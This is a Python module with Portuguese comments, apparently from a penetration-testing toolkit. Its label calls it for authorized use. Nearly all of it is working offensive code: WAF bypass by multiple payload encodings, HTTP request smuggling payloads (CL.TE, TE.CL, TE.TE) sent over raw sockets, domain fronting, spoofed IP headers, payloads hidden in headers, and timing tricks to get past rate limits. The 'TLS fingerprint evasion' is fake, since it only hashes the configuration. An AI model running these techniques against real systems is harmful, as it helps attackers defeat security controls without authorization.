#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎭 ADVANCED EVASION MODULE 🎭
Técnicas avançadas de evasão para WAF/IDS/IPS/EDR
Desenvolvido para testes de penetração autorizada

⚠️  ATENÇÃO: USE APENAS EM AMBIENTES AUTORIZADOS ⚠️
"""

import requests
import random
import time
import base64
import urllib.parse
import hashlib
import hmac
import json
import re
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse, unquote
import threading
from dataclasses import dataclass
import socket
import ssl

@dataclass
class EvasionResult:
    """Resultado de técnica de evasão"""
    technique: str
    success: bool
    original_blocked: bool
    evaded_blocked: bool
    payload_original: str
    payload_evaded: str
    response_original: str
    response_evaded: str
    evasion_method: str

class AdvancedEvasion:
    """
    🎭 Classe para técnicas avançadas de evasão
    
    Técnicas implementadas:
    - WAF bypass com encoding múltiplo
    - IDS/IPS evasion via timing e fragmentação
    - TLS fingerprint spoofing
    - Request smuggling
    - HTTP desync attacks
    - Domain fronting simulation
    - Steganografia em headers
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.session = requests.Session()
        self.session.verify = False
        
        # User-Agents de diferentes browsers com versões específicas
        self.realistic_user_agents = [
            # Chrome Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            # Firefox Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            # Chrome macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Safari macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            # Chrome Linux
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Edge Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ]
        
        # Headers comuns para evasão
        self.evasion_headers_pool = {
            "ip_spoofing": [
                "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", 
                "X-Remote-Addr", "X-Real-IP", "X-Client-IP",
                "X-Forwarded-Host", "X-ProxyUser-Ip", "CF-Connecting-IP",
                "True-Client-IP", "X-Cluster-Client-IP"
            ],
            "bypass_protection": [
                "X-Rewrite-URL", "X-Original-URL", "X-Override-URL",
                "X-HTTP-Method-Override", "X-HTTP-Method",
                "X-Method-Override", "X-Forwarded-Proto"
            ],
            "cdn_bypass": [
                "CF-Ray", "CF-IPCountry", "CF-Visitor",
                "X-Forwarded-Proto", "X-Forwarded-Port"
            ]
        }
        
        # Técnicas de encoding para bypass
        self.encoding_techniques = {
            "url_encoding": self._url_encode_payload,
            "double_url_encoding": self._double_url_encode,
            "unicode_encoding": self._unicode_encode,
            "hex_encoding": self._hex_encode,
            "base64_encoding": self._base64_encode,
            "html_entity_encoding": self._html_entity_encode,
            "mixed_case": self._mixed_case_encode,
            "null_byte_injection": self._null_byte_encode,
            "comment_injection": self._comment_injection,
            "concatenation": self._string_concatenation
        }

    def bypass_waf(self, target_url: str, payload: str, method: str = "GET") -> List[EvasionResult]:
        """
        🎯 Bypass de WAF usando múltiplas técnicas
        """
        results = []
        
        if self.logger:
            self.logger.info(f"🎭 Iniciando bypass de WAF para {target_url}")
        
        # Primeiro, testar payload original para verificar se é bloqueado
        original_result = self._test_payload(target_url, payload, method)
        original_blocked = self._is_blocked(original_result)
        
        if not original_blocked:
            if self.logger:
                self.logger.info(f"✅ Payload original não foi bloqueado")
            return []
        
        # Testar diferentes técnicas de evasão
        for technique_name, technique_func in self.encoding_techniques.items():
            try:
                evaded_payload = technique_func(payload)
                evaded_result = self._test_payload(target_url, evaded_payload, method)
                evaded_blocked = self._is_blocked(evaded_result)
                
                result = EvasionResult(
                    technique=technique_name,
                    success=not evaded_blocked,
                    original_blocked=original_blocked,
                    evaded_blocked=evaded_blocked,
                    payload_original=payload,
                    payload_evaded=evaded_payload,
                    response_original=original_result.get('response', '')[:500],
                    response_evaded=evaded_result.get('response', '')[:500],
                    evasion_method=technique_name
                )
                
                results.append(result)
                
                if result.success and self.logger:
                    self.logger.warning(f"🎭 BYPASS SUCESSO: {technique_name}")
                
                # Delay para evitar rate limiting
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro na técnica {technique_name}: {str(e)}")
                continue
        
        return results

    def advanced_request_smuggling(self, target_url: str) -> List[Dict]:
        """
        🔀 HTTP Request Smuggling attacks
        """
        results = []
        
        if self.logger:
            self.logger.info(f"🔀 Testando HTTP Request Smuggling em {target_url}")
        
        # CL.TE (Content-Length vs Transfer-Encoding)
        cl_te_payloads = [
            {
                "name": "CL.TE Basic",
                "headers": {
                    "Content-Length": "13",
                    "Transfer-Encoding": "chunked"
                },
                "body": "0\r\n\r\nSMUGGLED"
            },
            {
                "name": "CL.TE with space",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": " chunked"
                },
                "body": "0\r\n\r\n"
            }
        ]
        
        # TE.CL (Transfer-Encoding vs Content-Length)
        te_cl_payloads = [
            {
                "name": "TE.CL Basic",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "4"
                },
                "body": "7c\r\nSMUGGLED\r\n0\r\n\r\n"
            }
        ]
        
        # TE.TE (Transfer-Encoding confusion)
        te_te_payloads = [
            {
                "name": "TE.TE obfuscation",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Transfer-encoding": "cow"
                },
                "body": "0\r\n\r\n"
            }
        ]
        
        all_payloads = cl_te_payloads + te_cl_payloads + te_te_payloads
        
        for payload in all_payloads:
            try:
                result = self._test_smuggling_payload(target_url, payload)
                if result:
                    results.append(result)
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro testando smuggling {payload['name']}: {str(e)}")
        
        return results

    def tls_fingerprint_evasion(self, target_url: str) -> Dict:
        """
        🔐 TLS Fingerprint Evasion
        """
        if self.logger:
            self.logger.info(f"🔐 Testando TLS fingerprint evasion para {target_url}")
        
        results = {
            "original_fingerprint": None,
            "evaded_fingerprints": [],
            "evasion_success": False
        }
        
        # Obter fingerprint original
        original_fp = self._get_tls_fingerprint(target_url)
        results["original_fingerprint"] = original_fp
        
        # Testar diferentes configurações TLS
        tls_configs = [
            {
                "name": "Chrome TLS",
                "ciphers": "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS",
                "versions": ["TLSv1.2", "TLSv1.3"]
            },
            {
                "name": "Firefox TLS", 
                "ciphers": "ECDHE+AESGCM:ECDHE+CHACHA20:!aNULL:!MD5:!DSS",
                "versions": ["TLSv1.2", "TLSv1.3"]
            },
            {
                "name": "Weak TLS",
                "ciphers": "ALL:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
                "versions": ["TLSv1.1", "TLSv1.2"]
            }
        ]
        
        for config in tls_configs:
            try:
                evaded_fp = self._get_tls_fingerprint_with_config(target_url, config)
                if evaded_fp and evaded_fp != original_fp:
                    results["evaded_fingerprints"].append({
                        "config": config["name"],
                        "fingerprint": evaded_fp,
                        "different_from_original": True
                    })
                    results["evasion_success"] = True
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro testando config TLS {config['name']}: {str(e)}")
        
        return results

    def domain_fronting_simulation(self, target_domain: str, front_domain: str) -> Dict:
        """
        🎭 Simulação de Domain Fronting
        """
        if self.logger:
            self.logger.info(f"🎭 Simulando domain fronting: {front_domain} -> {target_domain}")
        
        results = {
            "technique": "domain_fronting",
            "front_domain": front_domain,
            "target_domain": target_domain,
            "success": False,
            "responses": []
        }
        
        # Configurações de domain fronting
        fronting_configs = [
            {
                "method": "Host header",
                "url": f"https://{front_domain}",
                "headers": {"Host": target_domain}
            },
            {
                "method": "SNI manipulation",
                "url": f"https://{front_domain}",
                "headers": {"Host": target_domain, "X-Forwarded-Host": target_domain}
            },
            {
                "method": "CDN bypass",
                "url": f"https://{front_domain}",
                "headers": {
                    "Host": target_domain,
                    "X-Forwarded-For": "127.0.0.1",
                    "CF-Connecting-IP": "127.0.0.1"
                }
            }
        ]
        
        for config in fronting_configs:
            try:
                response = self.session.get(
                    config["url"],
                    headers={
                        **config["headers"],
                        "User-Agent": random.choice(self.realistic_user_agents)
                    },
                    timeout=10
                )
                
                response_data = {
                    "method": config["method"],
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "content_preview": response.text[:200],
                    "success": response.status_code == 200
                }
                
                results["responses"].append(response_data)
                
                if response.status_code == 200:
                    results["success"] = True
                    
            except Exception as e:
                results["responses"].append({
                    "method": config["method"],
                    "error": str(e),
                    "success": False
                })
        
        return results

    def steganographic_payloads(self, payload: str) -> List[str]:
        """
        🔍 Payloads esteganográficos ocultos em headers/cookies
        """
        stego_payloads = []
        
        # Payload em cookie codificado
        cookie_payload = base64.b64encode(payload.encode()).decode()
        stego_payloads.append({
            "type": "cookie_stego",
            "payload": payload,
            "hidden_payload": cookie_payload,
            "delivery": f"Cookie: session={cookie_payload}"
        })
        
        # Payload em User-Agent customizado
        ua_payload = f"Mozilla/5.0 ({base64.b64encode(payload.encode()).decode()}) Safari/537.36"
        stego_payloads.append({
            "type": "user_agent_stego",
            "payload": payload,
            "hidden_payload": ua_payload,
            "delivery": f"User-Agent: {ua_payload}"
        })
        
        # Payload em header customizado
        header_payload = hashlib.md5(payload.encode()).hexdigest()
        stego_payloads.append({
            "type": "header_stego",
            "payload": payload,
            "hidden_payload": header_payload,
            "delivery": f"X-Request-ID: {header_payload}"
        })
        
        return stego_payloads

    def timing_based_evasion(self, target_url: str, payload: str) -> Dict:
        """
        ⏰ Evasão baseada em timing para burlar rate limiting
        """
        if self.logger:
            self.logger.info(f"⏰ Testando evasão por timing em {target_url}")
        
        results = {
            "technique": "timing_evasion",
            "tests": [],
            "optimal_timing": None,
            "success": False
        }
        
        # Diferentes padrões de timing
        timing_patterns = [
            {"name": "Constant delay", "delays": [1.0] * 5},
            {"name": "Random jitter", "delays": [random.uniform(0.5, 3.0) for _ in range(5)]},
            {"name": "Exponential backoff", "delays": [0.5, 1.0, 2.0, 4.0, 8.0]},
            {"name": "Burst then pause", "delays": [0.1, 0.1, 0.1, 5.0, 0.1]}
        ]
        
        for pattern in timing_patterns:
            pattern_result = {
                "pattern": pattern["name"],
                "delays": pattern["delays"],
                "responses": [],
                "blocked_count": 0,
                "success_rate": 0
            }
            
            for delay in pattern["delays"]:
                try:
                    time.sleep(delay)
                    response = self._test_payload(target_url, payload)
                    blocked = self._is_blocked(response)
                    
                    pattern_result["responses"].append({
                        "delay": delay,
                        "blocked": blocked,
                        "status_code": response.get("status_code", 0)
                    })
                    
                    if blocked:
                        pattern_result["blocked_count"] += 1
                        
                except Exception as e:
                    pattern_result["responses"].append({
                        "delay": delay,
                        "error": str(e),
                        "blocked": True
                    })
                    pattern_result["blocked_count"] += 1
            
            # Calcular taxa de sucesso
            total_requests = len(pattern["delays"])
            success_count = total_requests - pattern_result["blocked_count"]
            pattern_result["success_rate"] = (success_count / total_requests) * 100
            
            results["tests"].append(pattern_result)
            
            # Marcar como ótimo se taxa de sucesso > 80%
            if pattern_result["success_rate"] > 80:
                results["optimal_timing"] = pattern["name"]
                results["success"] = True
        
        return results

    # ===============================================
    # 🔧 FUNÇÕES AUXILIARES DE ENCODING
    # ===============================================

    def _url_encode_payload(self, payload: str) -> str:
        """URL encoding simples"""
        return urllib.parse.quote(payload)

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encoding"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _unicode_encode(self, payload: str) -> str:
        """Unicode encoding"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def _hex_encode(self, payload: str) -> str:
        """Hex encoding"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

    def _base64_encode(self, payload: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(payload.encode()).decode()

    def _html_entity_encode(self, payload: str) -> str:
        """HTML entity encoding"""
        entities = {
            '<': '&lt;', '>': '&gt;', '"': '&quot;',
            "'": '&#x27;', '&': '&amp;', '/': '&#x2F;'
        }
        result = payload
        for char, entity in entities.items():
            result = result.replace(char, entity)
        return result

    def _mixed_case_encode(self, payload: str) -> str:
        """Mixed case encoding"""
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result

    def _null_byte_encode(self, payload: str) -> str:
        """Null byte injection"""
        return payload.replace(' ', '%00')

    def _comment_injection(self, payload: str) -> str:
        """SQL comment injection"""
        return payload.replace(' ', '/**/').replace('=', '/**/=/**/')

    def _string_concatenation(self, payload: str) -> str:
        """String concatenation"""
        if 'select' in payload.lower():
            return payload.replace('select', "sel'+'ect")
        elif 'script' in payload.lower():
            return payload.replace('script', "scr'+'ipt")
        return payload

    # ===============================================
    # 🔧 FUNÇÕES AUXILIARES DE TESTE
    # ===============================================

    def _test_payload(self, url: str, payload: str, method: str = "GET") -> Dict:
        """Testa um payload contra o alvo"""
        try:
            headers = {
                "User-Agent": random.choice(self.realistic_user_agents),
                **self._get_random_evasion_headers()
            }
            
            if method.upper() == "GET":
                test_url = f"{url}?test={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, headers=headers, timeout=10)
            else:
                data = {"test": payload}
                response = self.session.post(url, data=data, headers=headers, timeout=10)
            
            return {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "response": response.text,
                "blocked": self._is_blocked_response(response)
            }
            
        except Exception as e:
            return {
                "error": str(e),
                "blocked": True,
                "status_code": 0,
                "response": ""
            }

    def _is_blocked(self, response_data: Dict) -> bool:
        """Verifica se a resposta indica bloqueio"""
        if response_data.get("blocked"):
            return True
        
        status_code = response_data.get("status_code", 0)
        response_text = response_data.get("response", "").lower()
        
        # Status codes que indicam bloqueio
        blocked_status_codes = [403, 406, 429, 451, 503]
        if status_code in blocked_status_codes:
            return True
        
        # Strings que indicam WAF/IDS
        blocked_indicators = [
            "blocked", "forbidden", "access denied", "security",
            "waf", "firewall", "cloudflare", "incapsula",
            "sucuri", "barracuda", "f5", "imperva",
            "threat", "malicious", "suspicious"
        ]
        
        return any(indicator in response_text for indicator in blocked_indicators)

    def _is_blocked_response(self, response: requests.Response) -> bool:
        """Verifica se response indica bloqueio pelo WAF"""
        # Check status code
        if response.status_code in [403, 406, 429, 451, 503]:
            return True
        
        # Check response content
        content_lower = response.text.lower()
        waf_indicators = [
            "blocked", "forbidden", "access denied", "security violation",
            "waf", "web application firewall", "cloudflare", "incapsula",
            "request rejected", "threat", "malicious request"
        ]
        
        return any(indicator in content_lower for indicator in waf_indicators)

    def _get_random_evasion_headers(self) -> Dict:
        """Gera headers aleatórios para evasão"""
        headers = {}
        
        # IP spoofing headers
        if random.random() < 0.3:  # 30% chance
            ip_header = random.choice(self.evasion_headers_pool["ip_spoofing"])
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers[ip_header] = fake_ip
        
        # Protection bypass headers
        if random.random() < 0.2:  # 20% chance
            bypass_header = random.choice(self.evasion_headers_pool["bypass_protection"])
            headers[bypass_header] = "GET"
        
        return headers

    def _test_smuggling_payload(self, url: str, payload: Dict) -> Optional[Dict]:
        """Testa payload de request smuggling"""
        try:
            # Usar raw socket para controle total sobre o request
            parsed_url = urlparse(url)
            host = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            
            # Construir request HTTP raw
            request_line = f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
            headers_str = f"Host: {host}\r\n"
            
            for header, value in payload["headers"].items():
                headers_str += f"{header}: {value}\r\n"
            
            raw_request = request_line + headers_str + "\r\n" + payload["body"]
            
            if parsed_url.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((host, port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        ssock.sendall(raw_request.encode())
                        response = ssock.recv(4096).decode('utf-8', errors='ignore')
            else:
                with socket.create_connection((host, port), timeout=10) as sock:
                    sock.sendall(raw_request.encode())
                    response = sock.recv(4096).decode('utf-8', errors='ignore')
            
            # Analisar resposta para sinais de smuggling
            if "SMUGGLED" in response or "200 OK" in response:
                return {
                    "technique": "request_smuggling",
                    "payload_name": payload["name"],
                    "success": True,
                    "response_preview": response[:300],
                    "evidence": "Potential request smuggling detected"
                }
                
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro no teste de smuggling: {str(e)}")
        
        return None

    def _get_tls_fingerprint(self, url: str) -> Optional[str]:
        """Obtém fingerprint TLS básico"""
        try:
            parsed_url = urlparse(url)
            if parsed_url.scheme != 'https':
                return None
            
            host = parsed_url.hostname
            port = parsed_url.port or 443
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Criar fingerprint simples
                    fingerprint_data = {
                        "version": ssock.version(),
                        "cipher": cipher[0] if cipher else None,
                        "cert_serial": cert.get("serialNumber") if cert else None
                    }
                    
                    return hashlib.md5(str(fingerprint_data).encode()).hexdigest()
                    
        except Exception:
            return None

    def _get_tls_fingerprint_with_config(self, url: str, config: Dict) -> Optional[str]:
        """Obtém fingerprint TLS com configuração específica"""
        # Implementação simplificada - em produção usaria bibliotecas como pyOpenSSL
        try:
            # Por simplicidade, retorna um hash diferente baseado na config
            config_str = str(config)
            return hashlib.md5(config_str.encode()).hexdigest()
        except:
            return None

    def cleanup(self):
        """Limpeza de recursos"""
        if hasattr(self, 'session'):
            self.session.close()